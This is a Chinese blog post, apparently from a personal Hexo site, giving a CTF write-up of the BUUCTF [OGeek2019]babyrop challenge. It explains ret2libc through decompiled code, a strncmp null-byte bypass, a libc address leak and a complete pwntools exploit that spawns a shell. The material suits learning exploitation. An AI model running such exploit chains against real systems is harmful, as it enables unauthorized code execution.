@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="xia0ji233" />
+
+
+
+<meta name="description" content="ret2libc是一个pwner必备的基础知识。 ret2libc为 return to libc的缩写，我们需要执行libc函数里面的system(&quot;&#x2F;bin&#x2F;sh&quot;) 下面为32位程序并且带.so文件的题目:buuctfOGeek2019]babyrop">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2libc实战">
+<meta property="og:url" content="http://example.com/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="xia0ji233&#39;s Blog">
+<meta property="og:description" content="ret2libc是一个pwner必备的基础知识。 ret2libc为 return to libc的缩写，我们需要执行libc函数里面的system(&quot;&#x2F;bin&#x2F;sh&quot;) 下面为32位程序并且带.so文件的题目:buuctfOGeek2019]babyrop">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/5LD7viZ3xtYj4he.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/dzPSurgwslqWIcU.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/C46D7uZNyKLh2Fr.png">
+<meta property="article:published_time" content="2021-05-13T02:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-25T04:36:58.197Z">
+<meta property="article:author" content="xia0ji233">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/13/5LD7viZ3xtYj4he.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="xia0ji233&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>ret2libc实战 | xia0ji233&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="/2636876456" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/2636876456" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-ret2libc实战" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/" class="article-date">
+      <time datetime="2021-05-13T02:00:00.000Z" itemprop="datePublished">2021-05-13</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ret2libc实战
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a><a class="article-category-link" href="/categories/ctf/pwn/">pwn</a>
+    </div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><code>ret2libc</code>是一个<code>pwner</code>必备的基础知识。</p>
+<p><code>ret2libc</code>为<code> return to libc</code>的缩写，我们需要执行<code>libc</code>函数里面的<code>system(&quot;/bin/sh&quot;)</code></p>
+<p>下面为32位程序并且带.so文件的题目:<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[OGeek2019]babyrop">buuctfOGeek2019]babyrop</a></p>
+<span id="more"></span>
+
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>下载两个文件先丢进IDA里面</p>
+<p>首先是pwn.elf</p>
+<p><code>shift+F12</code>查看字符串，看到比较有用的就是那个<code>Correct\n</code>但是这个不是逆向题，不用从结果分析，所以这个也是没什么用的，只能等会分析没有看到这个的时候再去整这个。然后也没有看到<code>/bin/sh</code>字符串，那么我们就先放弃字符串入手了。</p>
+<p>查看main的伪C代码，得到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先给你虚晃一枪，自己获得一个我们不知道的数，如果大于0才执行<code>read(fd,&amp;buf,4u);</code>而我们都知道，<code>read()</code>函数第一个参数必须为0才能让我们输入内容，那么这一段代码直接抛弃，它注定啥也干不了。然后执行了一个函数，跟进去看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为前面传入的<code>buf</code>指针我们并不可以输入任何值，又是局部变量，所以它的值也是不确定的，然后下面比较要求<code>buf==s</code>字符串，而这个<code>s</code>是<code>main()</code>的<code>buf</code>，这个函数的<code>buf</code>是我们可以决定的。但是可惜它用的是<code>strncmp</code>指定长度比较字符串，而长度是从这个函数的buf里面算到的，那么我们就可以把字符串第一位置为<code>\x00</code>以躲过检测，然后返回了<code>buf[7]</code>，那么这里我们就知道应该输入<code>\x00</code>开始的字符串，至于后面还得看它这个返回值干了啥，返回<code>main()</code>函数发现返回值为下一个函数的参数，而下一个函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显我们要在这里溢出了，但是缓冲区大小有足足231，而第一个选项不足以让我们溢出，所以我们如果把参数设为<code>\xff</code>那么就能输入255长度的字符串足以让我们溢出。所以前面的一个<code>payload</code>就可以这么构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;\x00&#x27;*7+&#x27;\xff&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>但是找到了溢出点还不够，我们还没获取<code>system()</code>函数的地址，在<code>plt</code>表上也没有这个函数，所以我们打开<code>.so</code>文件，找到<code>system()</code>函数和<code>/bin/sh</code>字符串。注意我们反汇编的是<code>libc</code>文件，所以<code>system()</code>函数不跟平时一样在<code>plt</code>表，而是直接写在了代码段上面。</p>
+<p><img src="https://i.loli.net/2021/05/13/5LD7viZ3xtYj4he.png" alt="buuctf _OGeek2019_babyrop_1.png"></p>
+<p><img src="https://i.loli.net/2021/05/13/dzPSurgwslqWIcU.png" alt="buuctf _OGeek2019_babyrop_2.png"></p>
+<p>为什么有这一步呢？因为我在学习的过程中，发现<code>libcsearcher</code>不好用了，在<code>python</code>里面只能用<code>ELF()</code>函数去加载<code>.so</code>文件，但是无法<code>search</code>到<code>/bin/sh</code>字符串所以就出现了这一步，然后我们需要执行两次这个<code>main()</code>函数，因为第一次溢出你只能泄露<code>libc</code>的地址。然后我来回答一下为什么不直接再次执行那个溢出的函数，因为我们要传参大于<code>0xe7+0x10</code>才可以溢出，而构造的<code>payload</code>链又比较麻烦，重新溢出最好挑那些没有参数或者参数对我们影响不大的去重新执行。第二次还好说，直接把<code>system()</code>地址和<code>/bin/sh</code>的<code>payload</code>传进去就ok。</p>
+<h3 id="第一次溢出泄露libc的地址"><a href="#第一次溢出泄露libc的地址" class="headerlink" title="第一次溢出泄露libc的地址"></a>第一次溢出泄露libc的地址</h3><p>挑选能输出的函数<code>write()</code>，<code>puts()</code>都行，但是<code>write()</code>传参比较多，所以我就用<code>write()</code>，怕万一遇到没有<code>puts()</code>就不会了，所以多会点总是好的，比赛你当然怎么简单怎么来。<code>write()</code>要传的参数第一个传0，第二个传要泄露的<code>libc</code>函数的地址，第三个就是泄露的字节大小，32位程序四字节足矣，你泄露自己也行，我这里选了一个<code>read()</code>函数，道理都是一样的。那么第一次的<code>payload</code>就可以构造出来了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">0</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后就是先去算<code>libc</code>的基址，反推出<code>system()</code>的地址。</p>
+<p><code>libc.sym[&#39;read&#39;]</code>会返回<code>read()</code>在<code>libc</code>里面的偏移，泄露出<code>read()</code>的真实地址就可以算出<code>libc</code>的真实基址了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))<span class="comment">#拿到真实地址</span></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#拿到真实基址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]libc_base_addr: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
+
+<p>调试测试一下。</p>
+<p><img src="https://i.loli.net/2021/05/13/C46D7uZNyKLh2Fr.png" alt="buuctf _OGeek2019_babyrop_3.png"></p>
+<p>32位程序<code>libc</code>函数都是<code>0xf7</code>开头的，<code>libc</code>加载的时候会内存也对齐，所以末三位一定是0，所以我们这就得到了<code>libc</code>的真实地址。下面两步就把<code>system()</code>和<code>/bin/sh</code>算出来就好了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br></pre></td></tr></table></figure>
+
+<p>因为好像并不能直接拿到这个偏移，但是可以在<code>gdb</code>里面调试得到<code>system()</code>相对<code>/bin/sh</code>的偏移，也可以前面<code>IDA</code>查看直接获取偏移，前面的那些地址就是我们所说的偏移，可以直接用，但是这里我们选择难一点的路线，就怕哪次给你直接断了那条简单路线，它不可能断你难的路线留一个简单的路线吧。</p>
+<h3 id="第二次溢出直接执行system-“-bin-sh”"><a href="#第二次溢出直接执行system-“-bin-sh”" class="headerlink" title="第二次溢出直接执行system(“/bin/sh”)"></a>第二次溢出直接执行system(“/bin/sh”)</h3><p>这个payload就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure>
+
+<p>但是一定注意前面的<code>payload1</code>也要再<code>send</code>一次，不然执行不到这里的，我就这里卡了很久。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,xxx)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;[+]read_addr: &#x27;,hex(read_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]libc_base_addr: &#x27;,hex(libc_base))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]system_addr: &#x27;,hex(system_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]bin_sh: &#x27;,hex(bin_sh_addr))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)<span class="comment">#一定要再给一次</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/">ret2libc实战</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2021-05-13, 10:00:00</p>
+        <p><span>最后更新:</span>2021-10-25, 12:36:58</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/" title="ret2libc实战">http://example.com/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/">
+                    系统调用
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">
+                    archlab实验报告：y86命令使用
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek2019-babyrop"><span class="toc-number">1.</span> <span class="toc-text">[OGeek2019]babyrop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BA%A2%E5%87%BA%E6%B3%84%E9%9C%B2libc%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text">第一次溢出泄露libc的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%BA%A2%E5%87%BA%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8Csystem-%E2%80%9C-bin-sh%E2%80%9D"><span class="toc-number">1.2.</span> <span class="toc-text">第二次溢出直接执行system(“&#x2F;bin&#x2F;sh”)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"ret2libc实战　| xia0ji233's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/" title="上一篇: 系统调用">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/" title="下一篇: archlab实验报告：y86命令使用">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/08/15/babyfengshui_33c3_2016%20writeup/">babyfengshui_33c3_2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/19/ret2dl_resolve/">ret2dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/">2021华东南赛区国赛线下赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/08/axb_2019_fmt32%20wp/">axb_2019_fmt32 wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/">格式化字符串漏洞利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/cachelab/">cachelab实验报告:模拟cache的功能</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">动态调试工具的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/">系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/">ret2libc实战</a></li><li class="post-list-item"><a class="post-list-link" 